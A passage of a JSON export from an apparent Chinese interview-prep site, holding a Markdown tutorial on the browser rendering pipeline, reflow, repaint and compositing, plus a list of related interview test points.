        "title": "开发的过程中你用到过哪些设计模式？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-24T02:49:59.000Z",
        "updateAt": "2023-12-17T18:13:23.000Z"
      },
      {
        "exerciseKey": "5893d2cc-0ce2-473b-9d42-341860dfdec9",
        "title": "设计模式分类",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:28:52.000Z",
        "updateAt": "2022-04-10T15:32:08.000Z"
      }
    ]
  },
  "214": {
    "id": 214,
    "tagId": 20,
    "title": "浏览器渲染过程",
    "explanation": "渲染流程\n----\n\n首先要了解的概念:\n\n*    渲染引擎：它是浏览器最核心的部分是 “Rendering Engine”，不过我们一般习惯将之称为 “浏览器内核”\n    \n*    渲染引擎主要包括的线程：\n    \n\n![](https://static.ecool.fun//article/fb4c804c-8d7a-4829-874f-674a4a126f08.awebp)\n\n各个线程主要职责：\n* **GUI渲染线程**：GUI 渲染线程负责渲染浏览器界面，解析 HTML，CSS，构建 DOM 树和 RenderObject 树，布局和绘制等。当界面需要重绘（Repaint）或由于某种操作引发回流（Reflow）时，该线程就会执行。\n* **JavaScript引擎线程**: JavaScript 引擎线程主要负责解析 JavaScript 脚本并运行相关代码。 JavaScript 引擎在一个Tab页（Renderer 进程）中无论什么时候都只有一个 JavaScript 线程在运行 JavaScript 程序。需要提起一点就是，GUI线程与JavaScript引擎线程是互斥的，这也是就是为什么JavaScript操作时间过长，会造成页面渲染不连贯，导致页面出现阻塞的原理。\n* **事件触发线程**：当一个事件被触发时该线程会把事件添加到待处理队列的队尾，等待 JavaScript 引擎的处理。 通常JavaScript引擎是单线程的，所以这些事件都会排队等待JS执行。\n* **定时器触发器**： 我们日常使用的setInterval 和 setTimeout 就在该线程中，原因可能就是：由于JS引擎是单线程的，如果处于阻塞线程状态就会影响记时的准确，所以需要通过单独的线程来记时并触发响应的事件这样子更为合理。\n* **Http请求线程**： 在 XMLHttpRequest 在连接后是通过浏览器新开一个线程请求，这个线程就Http请求线程，它 将检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件放到 JavaScript 引擎的处理队列中等待处理。\n\n* * *\n\n**有了上述的概念，对接下我们讲渲染流水线会有所帮助**\n\n简略版的渲染机制\n--------\n\n很久之前就把浏览器工作原理读完了，看了很多博客，文章，当时简简单单的梳理一些内容,如下👇\n\n简略版渲染机制一般分为以下几个步骤\n\n1.  处理 HTML 并构建 DOM 树。\n2.  处理 CSS 构建 CSSOM 树。\n3.  将 DOM 与 CSSOM 合并成一个渲染树。\n4.  根据渲染树来布局，计算每个节点的位置。\n5.  调用 GPU 绘制，合成图层，显示在屏幕上。\n\n![](https://static.ecool.fun//article/e7a2b3aa-8ee6-4f7d-99ee-757fd2e5cd54.awebp)\n\n接下来大概就是这么说：\n\n在构建 CSSOM 树时，会阻塞渲染，直至 CSSOM 树构建完成。并且构建 CSSOM 树是一个十分消耗性能的过程，所以应该尽量保证层级扁平，减少过度层叠，越是具体的 CSS 选择器，执行速度越慢。\n\n当 HTML 解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。也就是说，如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件。并且 CSS 也会影响 JS 的执行，只有当解析完样式表才会执行 JS，所以也可以认为这种情况下，CSS 也会暂停构建 DOM。\n\n![](https://static.ecool.fun//article/b55b5e6d-d5f7-4de5-9ee3-bde9d28686f1.awebp)\n\n![](https://static.ecool.fun//article/ecee37c2-2484-4e14-add3-2d639356db0f.awebp)\n\n说完这些，记下来就讲几个面试常常会提起的，会问你的知识点👇\n\n#### Load 和 DOMContentLoaded 区别\n\nLoad 事件触发代表页面中的 DOM，CSS，JS，图片已经全部加载完毕。\n\nDOMContentLoaded 事件触发代表初始的 HTML 被完全加载和解析，不需要等待 CSS，JS，图片加载。\n\n#### 图层\n\n一般来说，可以把普通文档流看成一个图层。特定的属性可以生成一个新的图层。**不同的图层渲染互不影响**，所以对于某些频繁需要渲染的建议单独生成一个新图层，提高性能。**但也不能生成过多的图层，会引起反作用。**\n\n通过以下几个常用属性可以生成新图层\n\n*   3D 变换：`translate3d`、`translateZ`\n*   `will-change`\n*   `video`、`iframe` 标签\n*   通过动画实现的 `opacity` 动画转换\n*   `position: fixed`\n\n#### 重绘（Repaint）和回流（Reflow）\n\n重绘和回流是渲染步骤中的一小节，但是这两个步骤对于性能影响很大。\n\n*   重绘是当节点需要更改外观而不会影响布局的，比如改变 `color` 就叫称为重绘\n*   回流是布局或者几何属性需要改变就称为回流。\n\n回流必定会发生重绘，重绘不一定会引发回流。回流所需的成本比重绘高的多，改变深层次的节点很可能导致父节点的一系列回流。\n\n所以以下几个动作可能会导致性能问题：\n\n*   改变 window 大小\n*   改变字体\n*   添加或删除样式\n*   文字改变\n*   定位或者浮动\n*   盒模型\n\n很多人不知道的是，重绘和回流其实和 Event loop 有关。\n\n1.  当 Event loop 执行完 Microtasks 后，会判断 document 是否需要更新。因为浏览器是 60Hz 的刷新率，每 16ms 才会更新一次。\n2.  然后判断是否有 `resize` 或者 `scroll` ，有的话会去触发事件，所以 `resize` 和 `scroll` 事件也是至少 16ms 才会触发一次，并且自带节流功能。\n3.  判断是否触发了 media query\n4.  更新动画并且发送事件\n5.  判断是否有全屏操作事件\n6.  执行 `requestAnimationFrame` 回调\n7.  执行 `IntersectionObserver` 回调，该方法用于判断元素是否可见，可以用于懒加载上，但是兼容性不好\n8.  更新界面\n9.  以上就是一帧中可能会做的事情。如果在一帧中有空闲时间，就会去执行 `requestIdleCallback` 回调。\n\n以上内容来自于 [HTML 文档](https://link.juejin.cn/?target=https%3A%2F%2Fhtml.spec.whatwg.org%2Fmultipage%2Fwebappapis.html%23event-loop-processing-model \"https://html.spec.whatwg.org/multipage/webappapis.html#event-loop-processing-model\")\n\n#### 减少重绘和回流\n\n*   使用 `translate` 替代 `top`\n    \n    ```\n    <div class=\"test\"></div>\n    <style>\n    \t.test {\n    \t\tposition: absolute;\n    \t\ttop: 10px;\n    \t\twidth: 100px;\n    \t\theight: 100px;\n    \t\tbackground: red;\n    \t}\n    </style>\n    <script>\n    \tsetTimeout(() => {\n            // 引起回流\n    \t\tdocument.querySelector('.test').style.top = '100px'\n    \t}, 1000)\n    </script>\n    \n    ```\n    \n*   使用 `visibility` 替换 `display: none` ，因为前者只会引起重绘，后者会引发回流（改变了布局）\n    \n*   把 DOM 离线后修改，比如：先把 DOM 给 `display:none` (有一次 Reflow)，然后你修改100次，然后再把它显示出来\n    \n*   不要把 DOM 结点的属性值放在一个循环里当成循环里的变量\n    \n    ```\n    for(let i = 0; i < 1000; i++) {\n        // 获取 offsetTop 会导致回流，因为需要去获取正确的值\n        console.log(document.querySelector('.test').style.offsetTop)\n    }\n    \n    ```\n    \n*   不要使用 table 布局，可能很小的一个小改动会造成整个 table 的重新布局\n    \n*   动画实现的速度的选择，动画速度越快，回流次数越多，也可以选择使用 `requestAnimationFrame`\n    \n*   CSS 选择符从右往左匹配查找，避免 DOM 深度过深\n    \n*   将频繁运行的动画变为图层，图层能够阻止该节点回流影响别的元素。比如对于 `video` 标签，浏览器会自动将该节点变为图层。\n    \n\n* * *\n\n这不是我想梳理的内容\n----------\n\n上面的渲染流程是我一年前就在我笔记中存在的内容，我还记得当时学习的方式是囫囵吞枣式的，上面☝简略版的渲染流程，我印象中是在GitHub上面某博看看的，当时直接Copy下来的，当时觉得这个渲染原理这块有了别人梳理好的结论，自己多看看，会记住的，**事实上，面试的时候，提起这部分的时候，深度明显不够，自然就被问倒了**\n\n**下来梳理了一份详细的版本，坦白说，作为一个学者，自然是站在巨人的肩膀上，去总结梳理知识，我认为这是对我最有效的学习方式**\n\n让我带着你🚗重温一般渲染流程吧\n\n* * *\n\n详细版的渲染机制\n--------\n\n较为专业的术语总结为以下阶段：\n\n1.  构建DOM树\n2.  样式计算\n3.  布局阶段\n4.  分层\n5.  绘制\n6.  分块\n7.  光栅化\n8.  合成\n\n* * *\n\n你可以想象一下，从0，1字节流到最后页面展现在你面前，这里面渲染机制肯定很复杂，所以渲染模块把执行过程中化为很多的子阶段，渲染引擎从网络进程拿到字节流数据后，经过这些子阶段的处理，最后输出像素，这个过程可以称为`渲染流水线` ，我们从一张图上来看👇\n\n![](https://static.ecool.fun//article/e0d1f1d2-7b96-4f33-93e7-3083ab04eaa2.awebp)\n\n那接下来就从每个阶段来梳理一下大致过程。\n\n### 构建DOM树\n\n这个过程主要工作就是讲HTML内容转换为浏览器DOM树结构\n\n*   [ ]  字节→字符→令牌→节点→对象模型(DOM)\n\n文档对象模型(DOM)\n\n```\n<html>\n  <head>\n    <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n    <link href=\"style.css\" rel=\"stylesheet\">\n    <title>Critical Path</title>\n  </head>\n  <body>\n    <p>Hello <span>web performance</span> students!</p>\n    <div><img src=\"awesome-photo.jpg\"></div>\n  </body>\n</html>\n\n```\n\n我们先看看数据是怎么样转换的👇\n\n![](https://static.ecool.fun//article/fed330ad-6d89-4415-8c03-769b80afc71e.awebp)\n\n大概过程：\n\n1.  \\*\\*转换：\\*\\*浏览器从磁盘或网络读取 HTML 的原始字节，并根据文件的指定编码（例如 UTF-8）将它们转换成各个字符。\n2.  \\*\\*令牌化：\\*\\*浏览器将字符串转换成 [W3C HTML5 标准](https://link.juejin.cn/?target=https%3A%2F%2Fhtml.spec.whatwg.org%2Fmultipage%2Fparsing.html \"https://html.spec.whatwg.org/multipage/parsing.html\")规定的各种令牌，例如，“”、“”，以及其他尖括号内的字符串。每个令牌都具有特殊含义和一组规则。\n3.  \\*\\*词法分析:\\*\\*发出的令牌转换成定义其属性和规则的“对象”。\n4.  \\*\\*DOM构建:\\*\\*最后，由于 HTML 标记定义不同标记之间的关系（一些标记包含在其他标记内），创建的对象链接在一个树数据结构内，此结构也会捕获原始标记中定义的父项-子项关系：_HTML_ 对象是 _body_ 对象的父项，_body_ 是 _paragraph_ 对象的父项，依此类推。\n\n我们把上述这样子的过程就叫做是构建DOM树过程\n\n### 样式计算\n\n这个子阶段主要有三个步骤\n\n*   [ ]  格式化样式表\n*   [ ]  标准化样式表\n*   [ ]  计算每个DOM节点具体样式\n\n#### 格式化样式表\n\n我们拿到的也就是0，1字节流数据，浏览器无法直接去识别的，所以渲染引擎收到CSS文本数据后，会执行一个操作，转换为浏览器可以理解的结构-`styleSheets`\n\n如果你很想了解这个格式化的过程，可以好好去研究下，不同的浏览器可能在CSS格式化过程中会有所不同，在这里就不展开篇幅了。\n\n通过浏览器的控制台`document.styleSheets`可以来查看这个最终结果。**通过JavaScript可以完成查询和修改功能**,**或者说这个阶段为后面的样式操作提供基石。**\n\n![](https://static.ecool.fun//article/2525e4f8-93a2-4796-9024-a4b9864e92f7.awebp)\n\n#### 标准化样式表\n\n什么是标准化样式表呢?先看一段CSS文本👇\n\n```\nbody { font-size: 2em }\np {color:blue;}\nspan  {display: none}\ndiv {font-weight: bold}\ndiv  p {color:green;}\ndiv {color:red; }\n\n```\n\n有些时候，我们写CSS 样式的时候，会写`font-size:2em;color:red;font-weight:bold`,像这些数值并不容易被渲染引擎所理解，因此需要在计算样式之前将它们标准化，如`em`\\->`px`,`red`\\->`rgba(255,0,0,0)`,`bold`\\->`700`等等。\n\n上面的代码标准后属性值是什么样子呢👇\n\n![](https://static.ecool.fun//article/3a7ff475-9eac-41d8-9312-a53ad8d835f2.awebp)\n\n#### 计算每个DOM节点具体样式\n\n通过`格式化`和`标准化`，接下来就是计算每个节点具体样式信息了。\n\n计算规则：`继承`和`层叠`\n\n`继承`：每个子节点会默认去继承父节点的样式，如果父节点中找不到，就会采用浏览器默认的样式，也叫`UserAgent样式`。\n\n`层叠`：样式层叠，是CSS一个基本特征，它定义如何合并来自多个源的属性值的算法。某种意义上，它处于核心地位，具体的层叠规则属于深入 CSS 语言的范畴，这里就补展开篇幅说了。\n\n不过值得注意的是，在计算完样式之后，所有的样式值会被挂在到`window.getComputedStyle`当中，也就是可以**通过JS来获取计算后的样式**，非常方便。\n\n这个阶段，完成了DOM节点中每个元素的具体样式，计算过程中要遵循CSS的`继承`和`层叠`两条规则，最终输出的内容是每个节点DOM的样式，被保存在ComputedStyle中。\n\n想了解每个 DOM 元素最终的计算样式，可以打开 Chrome 的“开发者工具”，选择第一个“element”标签，比如我下面就选择了div标签，然后再选择“Computed”子标签，如下图所示：\n\n![](https://static.ecool.fun//article/f0a97d1a-84e8-41e5-a885-5c3478626e6e.awebp)\n\n#### 另外一种说法CSSOM\n\n如果不是很理解的话，可以看这里👇\n\n![](https://static.ecool.fun//article/d11625eb-ce05-481f-82a6-71424806ca13.awebp)\n\n跟处理HTML一样，我们需要更具CSS两个规则：`继承`和`层叠`转换成某种浏览器能理解和处理的东西，处理过程类似处理HTML，如上图☝\n\nCSS 字节转换成字符，接着转换成令牌和节点，最后链接到一个称为“CSS 对象模型”(CSSOM) 的树结构内👇\n\n![](https://static.ecool.fun//article/ba164105-41c6-49ac-8eaf-766230fdc464.awebp)\n\n很多人肯定看这个很熟悉，确实，很多博客都是基于CSSOM说法来讲的，我要说的是：\n\n**和DOM不一样，源码中并没有CSSOM这个词，所以很多文章说的CSSOM应该就是styleSheets**，当然了这个styleSheets我们可以打印出来的\n\n**很多文章说法是渲染树也是16年前的说法，现在代码重构了，我们可以把LayoutTree看成是渲染树，不过它们之间还是有些区别的。**\n\n### 生成布局树\n\n上述过程已经完成DOM树（DOM树）构建，以及样式计算（DOM样式），接下来就是要通过浏览器的布局系统确定**元素位置**，也就是生成一颗布局树（Layout Tree）,之前说法叫 **渲染树**。\n\n#### 创建布局树\n\n1.  在DOM树上不可见的元素，head元素，meta元素等，以及使用display:none属性的元素，最后都不会出现在布局树上，所以**浏览器布局系统需要额外去构建一棵只包含可见元素布局树。**\n    \n2.  我们直接结合图来看看这个布局树构建过程：\n    \n    ​\n    \n    ![](https://static.ecool.fun//article/b93aedb2-1d23-4c29-b404-21ac5ea9106c.awebp)\n    \n    为了构建布局树，浏览器布局系统大体上完成了下面这些工作：\n    \n\n*   [x]  遍历DOM树可见节点，并把这些节点加到布局树中\n*   [x]  对于不可见的节点，head,meta标签等都会被忽略。对于body.p.span 这个元素，它的属性包含display:none,所以这个元素没有被包含进布局树。\n\n#### 布局计算\n\n接下来就是要计算布局树节点的坐标位置，布局的计算过程非常复杂，张开介绍的话，会显得文章过于臃肿，大多数情况下，我们只需要知道**它所做的工作是什么**，想知道它是如何做的话，可以看看以下两篇文章👇\n\n*   [x]  [从Chrome源码看浏览器如何layout布局](https://link.juejin.cn/?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F25445527%3Frefer%3Ddreawer \"https://zhuanlan.zhihu.com/p/25445527?refer=dreawer\")\n*   [x]  [人人FED团队的文章-从Chrome源码看浏览器如何layout布局](https://link.juejin.cn/?target=https%3A%2F%2Fwww.rrfed.com%2F2017%2F02%2F26%2Fchrome-layout%2F \"https://www.rrfed.com/2017/02/26/chrome-layout/\")\n\n### 梳理前三个阶段\n\n一图概括上面三个阶段\n\n![](https://static.ecool.fun//article/5c0b7df8-3488-442b-ad36-eff76f8595f1.awebp)\n\n### 分层\n\n*   [x]  生成图层树（Layer Tree）\n*   [x]  拥有层叠上下文属性的元素会被提升为单独一层\n*   [x]  需要裁剪（clip）的地方也会创建图层\n*   [x]  图层绘制\n\n首先需要知道的就是，浏览器在构建完`布局树`后，还需要进行一系列操作，这样子可能考虑到一些复杂的场景，比如一些些复杂的 3D 变换、页面滚动，或者使用 z-indexing 做 z 轴排序等，还有比如是含有层叠上下文如何控制显示和隐藏等情况。\n\n**生成图层树**\n\n你最终看到的页面，就是由这些图层一起叠加构成的，它们按照一定的顺序叠加在一起，就形成了最终的页面。\n\n**浏览器的页面实际上被分成了很多图层，这些图层叠加后合成了最终的页面。**\n\n我们来看看图层与布局树之间关系，如下图👇\n\n![](https://static.ecool.fun//article/edc2df1e-8fdf-4252-ba6b-343b2fcb55c8.awebp)\n\n通常情况下，**并不是布局树的每个节点都包含一个图层，如果一个节点没有对应的层，那么这个节点就从属于父节点的图层。**\n\n那什么情况下，渲染引擎会为特定的节点创建新图层呢？\n\n有两种情况需要分别讨论，一种是**显式合成**，一种是**隐式合成**。\n\n**显式合成**\n\n一、 拥有**层叠上下文**的节点。\n\n层叠上下文也基本上是有一些特定的CSS属性创建的，一般有以下情况:\n\n1.  HTML根元素本身就具有层叠上下文。\n2.  普通元素设置**position不为static**并且**设置了z-index属性**，会产生层叠上下文。\n3.  元素的 **opacity** 值不是 1\n4.  元素的 **transform** 值不是 none\n5.  元素的 **filter** 值不是 none\n6.  元素的 **isolation** 值是isolate\n7.  **will-change**指定的属性值为上面任意一个。(will-change的作用后面会详细介绍)\n\n二、需要**剪裁**(clip)的地方。\n\n比如一个标签很小，50\\*50像素，你在里面放了非常多的文字，那么超出的文字部分就需要被剪裁。当然如果出现了滚动条，那么滚动条也会被单独提升为一个图层，如下图\n\n![](https://static.ecool.fun//article/c0743259-78dc-4a7a-9132-161ac6cdd7dd.awebp)\n\n数字1箭头指向的地方，可以看看，可能效果不是很明显，大家可以自己打开这个Layers探索下。\n\n**元素有了层叠上下文的属性或者需要被剪裁，满足其中任意一点，就会被提升成为单独一层。**\n\n**隐式合成**\n\n这是一种什么样的情况呢，通俗意义上来说，就是`z-index`比较低的节点会提升为一个单独的途图层，那么`层叠等级比它高`的节点**都会**成为一个独立的图层。\n\n[浏览器渲染流程&Composite（渲染层合并）简单总结](https://link.juejin.cn/?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000014520786 \"https://segmentfault.com/a/1190000014520786\")\n\n**缺点：** 根据上面的文章来说，在一个大型的项目中，一个`z-index`比较低的节点被提升为单独图层后，层叠在它上面的元素统统都会提升为单独的图层，我们知道，上千个图层，会增大内存的压力，有时候会让页面崩溃。这就是`层爆炸`\n\n### 绘制\n\n完成了图层的构建，接下来要做的工作就是图层的绘制了。图层的绘制跟我们日常的绘制一样，每次都会把一个复杂的图层拆分为很小的**绘制指令**，然后再按照这些指令的顺序组成一个**绘制列表**，类似于下图👇\n\n![](https://static.ecool.fun//article/da19ede9-f17c-4702-b7e5-7a8b762dfb1a.awebp)\n\n从图中可以看出，绘制列表中的指令其实非常简单，就是让其执行一个简单的绘制操作，比如绘制粉色矩形或者黑色的线等。而绘制一个元素通常需要好几条绘制指令，因为每个元素的背景、前景、边框都需要单独的指令去绘制。\n\n大家可以在 Chrome 开发者工具中在设置栏中展开 `more tools`, 然后选择`Layers`面板，就能看到下面的绘制列表:\n\n![](https://static.ecool.fun//article/1d3d3f13-0878-4ed7-a638-067f5ea453c8.awebp)\n\n在该图中，\\*\\*箭头2指向的区域 \\*\\*就是 document 的绘制列表，\\*\\*箭头3指向的拖动区域 \\*\\*中的进度条可以重现列表的绘制过程。\n\n当然了，绘制图层的操作在渲染进程中有着专门的线程，这个线程叫做合成线程。\n\n### 分块\n\n*    接下来我们就要开始绘制操作了，实际上在渲染进程中绘制操作是由专门的线程来完成的，这个线程叫**合成线程**。\n    \n*    绘制列表准备好了之后，渲染进程的主线程会给`合成线程`发送`commit`消息，把绘制列表提交给合成线程。接下来就是合成线程一展宏图的时候啦。\n    \n\n> 你想呀，有时候，你的图层很大，或者说你的页面需要使用滚动条，然后页面的内容太多，多的无法想象，这个时候需要滚动好久才能滚动到底部，但是通过视口，用户只能看到页面的很小一部分，所以在这种情况下，要绘制出所有图层内容的话，就会产生太大的开销，而且也没有必要。\n\n*   [ ]  基于上面的原因，合成线程会讲图层划分为图块(tile)\n*   [ ]  这些块的大小一般不会特别大，通常是 256 \\* 256 或者 512 \\* 512 这个规格。这样可以大大加速页面的首屏展示。\n\n首屏渲染加速可以这么理解：\n\n> 因为后面图块（非视口内的图块）数据要进入 GPU 内存，考虑到浏览器内存上传到 GPU 内存的操作比较慢，即使是绘制一部分图块，也可能会耗费大量时间。针对这个问题，Chrome 采用了一个策略: 在首次合成图块时只采用一个**低分辨率**的图片，这样首屏展示的时候只是展示出低分辨率的图片，这个时候继续进行合成操作，当正常的图块内容绘制完毕后，会将当前低分辨率的图块内容替换。这也是 Chrome 底层优化首屏加载速度的一个手段。\n\n### 光栅化\n\n接着上面的步骤，有了图块之后，**合成线程会按照视口附近的图块来优先生成位图，实际生成位图的操作是由栅格化来执行的。所谓栅格化，是指将图块转换为位图。**\n\n*   [x]  图块是栅格化执行的最小单位\n*   [x]  渲染进程中专门维护了一个**栅格化线程池**，专门负责把**图块**转换为**位图数据**\n*   [x]  合成线程会选择视口附近的**图块(tile)**，把它交给**栅格化线程池**生成位图\n*   [x]  生成位图的过程实际上都会使用 GPU 进行加速，生成的位图最后发送给`合成线程`\n\n运行方式如下👇\n\n![](https://static.ecool.fun//article/1c82cde7-8d48-40c1-96b1-005616b1095d.awebp)\n\n通常，栅格化过程都会使用 GPU 来加速生成，使用 GPU 生成位图的过程叫快速栅格化，或者 GPU 栅格化，生成的位图被保存在 GPU 内存中。\n\n相信你还记得，GPU 操作是运行在 GPU 进程中，如果栅格化操作使用了 GPU，那么最终生成位图的操作是在 GPU 中完成的，这就涉及到了跨进程操作。具体形式你可以参考下图：\n\n![](https://static.ecool.fun//article/2aca32c0-c61a-4d96-bb16-7ee4bb1e779b.awebp)\n\n从图中可以看出，渲染进程把生成图块的指令发送给 GPU，然后在 GPU 中执行生成图块的位图，并保存在 GPU 的内存中。\n\n### 合成和显示\n\n栅格化操作完成后，**合成线程**会生成一个绘制命令，即\"DrawQuad\"，并发送给浏览器进程。\n\n浏览器进程中的`viz组件`接收到这个命令，根据这个命令，把页面内容绘制到内存，也就是生成了页面，然后把这部分内存发送给显卡,那你肯定对显卡的原理很好奇。\n\n看了某博主对显示器显示图像的原理解释:\n\n> 无论是 PC 显示器还是手机屏幕，都有一个固定的刷新频率，一般是 60 HZ，即 60 帧，也就是一秒更新 60 张图片，一张图片停留的时间约为 16.7 ms。而每次更新的图片都来自显卡的**前缓冲区**。而显卡接收到浏览器进程传来的页面后，会合成相应的图像，并将图像保存到**后缓冲区**，然后系统自动将`前缓冲区`和`后缓冲区`对换位置，如此循环更新。\n\n这个时候，心中就有点概念了，比如某个动画大量占用内存时，浏览器生成图像的时候会变慢，图像传送给显卡就会不及时，而显示器还是以不变的频率刷新，因此会出现卡顿，也就是明显的掉帧现象。\n\n* * *\n\n用一张图来总结👇\n\n![](https://static.ecool.fun//article/20c8fbb1-de64-4fc9-bf11-df1c08f44fc5.awebp)\n\n我们把上面整个的渲染流水线，用一张图片更直观的表示👇\n\n![](https://static.ecool.fun//article/831fc3d2-552a-40f4-aa16-e81cc2001c14.awebp)\n\n回流-重绘-合成\n--------\n\n更新视图三种方式\n\n*   [x]  回流\n*   [x]  重绘\n*   [x]  合成\n\n### 回流\n\n另外一个叫法是重排，回流触发的条件就是:**对 DOM 结构的修改引发 DOM 几何尺寸变化的时候**,会发生`回流`过程。\n\n具体一点，有以下的操作会触发回流:\n\n1.  一个 DOM 元素的几何属性变化，常见的几何属性有`width`、`height`、`padding`、`margin`、`left`、`top`、`border` 等等, 这个很好理解。\n2.  使 DOM 节点发生`增减`或者`移动`。\n3.  读写 `offset`族、`scroll`族和`client`族属性的时候，浏览器为了获取这些值，需要进行回流操作。\n4.  调用 `window.getComputedStyle` 方法。\n\n一些常用且会导致回流的属性和方法：\n\n*   `clientWidth`、`clientHeight`、`clientTop`、`clientLeft`\n*   `offsetWidth`、`offsetHeight`、`offsetTop`、`offsetLeft`\n*   `scrollWidth`、`scrollHeight`、`scrollTop`、`scrollLeft`\n*   `scrollIntoView()`、`scrollIntoViewIfNeeded()`\n*   `getComputedStyle()`\n*   `getBoundingClientRect()`\n*   `scrollTo()`\n\n依照上面的渲染流水线，触发回流的时候，如果 DOM 结构发生改变，则重新渲染 DOM 树，然后将后面的流程(包括主线程之外的任务)全部走一遍。\n\n![](https://static.ecool.fun//article/38a54e55-0b88-4f4d-9677-387d372d9640.awebp)\n\n### 重绘\n\n当页面中元素样式的改变并不影响它在文档流中的位置时（例如：`color`、`background-color`、`visibility`等），浏览器会将新样式赋予给元素并重新绘制它，这个过程称为重绘。\n\n根据概念，我们知道由于没有导致 DOM 几何属性的变化，因此元素的位置信息不需要更新，从而省去布局的过程，流程如下：\n\n![](https://static.ecool.fun//article/e1ff6405-c8e9-4c8c-b3b7-3d1aeac2e11d.awebp)\n\n跳过了`布局树`和`建图层树`,直接去绘制列表，然后在去分块,生成位图等一系列操作。\n\n可以看到，重绘不一定导致回流，但回流一定发生了重绘。\n\n### 合成\n\n还有一种情况：就是**更改了一个既不要布局也不要绘制**的属性，那么渲染引擎会跳过布局和绘制，直接执行后续的**合成**操作，这个过程就叫**合成**。\n\n举个例子：比如使用CSS的transform来实现动画效果，**避免了回流跟重绘**，直接在非主线程中执行合成动画操作。显然这样子的效率更高，毕竟这个是在非主线程上合成的，没有占用主线程资源，另外也避开了布局和绘制两个子阶段，所以**相对于重绘和重排，合成能大大提升绘制效率。**\n\n利用这一点好处：\n\n*   [x]  合成层的位图，会交由 GPU 合成，比 CPU 处理要快\n*   [x]  当需要 repaint 时，只需要 repaint 本身，不会影响到其他的层\n*   [x]  对于 transform 和 opacity 效果，不会触发 layout 和 paint\n\n提升合成层的最好方式是使用 CSS 的 will-change 属性\n\n### GPU加速原因\n\n比如利用 CSS3 的`transform`、`opacity`、`filter`这些属性就可以实现合成的效果，也就是大家常说的**GPU加速**。\n\n*   [x]  在合成的情况下，直接跳过布局和绘制流程，进入`非主线程`处理部分，即直接交给`合成线程`处理。\n*   [x]  充分发挥`GPU`优势，合成线程生成位图的过程中会调用线程池，并在其中使用`GPU`进行加速生成，而GPU 是擅长处理位图数据的。\n*   [x]  没有占用主线程的资源，即使主线程卡住了，效果依然流畅展示。",
    "testPoint": "## 一、整体流程认知\n\n浏览器从获取 HTML 到页面最终可见，大致经历如下流程：\n\n1. **构建 DOM 树**（HTML 解析）\n2. **构建 CSSOM 树**（CSS 解析）\n3. **合并 DOM 和 CSSOM 构建渲染树**\n4. **布局（Layout / Reflow）**\n5. **绘制（Paint）**\n6. **合成（Compositing）并展示到屏幕**\n\n## 二、各阶段详细考点\n\n### 1. 构建 DOM 树\n\n* HTML 是如何被解析成 DOM 的？\n* 标签遇到 `<script>`（未设置 async/defer）会阻塞解析吗？\n* 如何理解 Tokenizer 与 Parser 的作用？\n\n### 2. 构建 CSSOM 树\n\n* CSS 如何被解析？\n* `@import` 和外链样式表是否会阻塞渲染？\n* 哪些 CSS 特性影响构建时长？\n\n### 3. 渲染树（Render Tree）\n\n* 渲染树包含哪些节点？（只包含可见、非 `display: none` 元素）\n* 为什么要将 DOM 和 CSSOM 合并？\n* `visibility: hidden` 的节点会进入渲染树吗？\n\n### 4. 布局（Reflow）\n\n* 什么是回流？哪些操作会触发回流？\n* 元素大小和位置如何被计算？\n* 回流是逐层还是自底向上进行的？\n\n### 5. 绘制（Paint）\n\n* 什么是重绘（Repaint）？与回流有何区别？\n* 哪些属性修改只触发重绘？如 `color`、`background`。\n* Paint 的性能开销大吗？是否可以合并？\n\n### 6. 分层与合成（Compositing）\n\n* 浏览器如何将图层合成到屏幕？\n* 哪些属性会触发新图层？（如 `transform`、`will-change`、`video`）\n* 什么是合成线程（Compositor Thread）？\n\n## 三、性能相关考点\n\n### 1. 重排（Reflow）与重绘（Repaint）\n\n* 触发 Reflow 的典型操作有哪些？如修改 `offsetHeight`。\n* 如何批量操作 DOM 避免多次回流？\n* 为什么要使用 `requestAnimationFrame` 而非 `setInterval`？\n\n### 2. 渲染优化\n\n* Critical Rendering Path 是什么？\n* 如何减少关键渲染路径的长度？\n* 如何优化首屏渲染？（如懒加载、压缩资源、合理使用 CSS）\n\n### 3. 异步加载策略\n\n* `defer` vs `async` 有何区别？\n* 为什么说外链 CSS 是渲染阻塞资源？\n* 浏览器解析过程中如何预加载资源？\n\n## 四、其他拓展考点\n\n### 1. 渲染过程中的异步任务处理\n\n* 微任务 / 宏任务对渲染顺序是否有影响？\n* DOM 渲染是否会被长时间脚本阻塞？\n\n### 2. 渐进式渲染\n\n* 什么是 FCP（First Contentful Paint）？\n* 如何实现渐进式页面加载体验？\n* `content-visibility` 如何帮助提升渲染性能？\n\n### 3. 首屏渲染指标（Core Web Vitals）\n\n* LCP、FID、CLS 分别是什么？\n* 如何通过优化渲染过程提升 Web Vitals 分数？\n\n## 五、高频面试题示例\n\n* 浏览器是如何从 URL 到页面渲染的？\n* 修改哪些 CSS 属性会触发重排？哪些会触发重绘？\n* 如何优化长列表的渲染性能？\n* 为什么使用 `transform: translate3d(...)` 可以提升性能？\n* DOM 操作过多页面卡顿，如何排查和优化？\n",
    "exerciseKeyList": "[\"5994273f-200b-4dd2-99d7-d05efd937a04\",\"d598569e-a03a-4110-bdbc-fd0c9f0ca18d\",\"61b47ff6-9c4d-4fa2-b126-dc5ffff3e7c6\",\"5b612b6a-3828-4cd9-9de4-b05bb36a4e3d\",\"55af61ba-c3c4-4714-a047-02dedd49d0df\",\"9c119d14-fe3b-4f23-9a51-222c50529890\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-12-17T13:52:54.000Z",
    "updateAt": "2025-07-16T11:16:18.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "55af61ba-c3c4-4714-a047-02dedd49d0df",
        "title": "html文档渲染过程，css文件和js文件的下载，是否会阻塞渲染？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-01T02:31:38.000Z",
        "updateAt": "2024-08-10T17:05:37.000Z"
      },
      {
        "exerciseKey": "5994273f-200b-4dd2-99d7-d05efd937a04",
        "title": "dom 渲染能使用 GPU 加速吗？",
        "category": "QA",
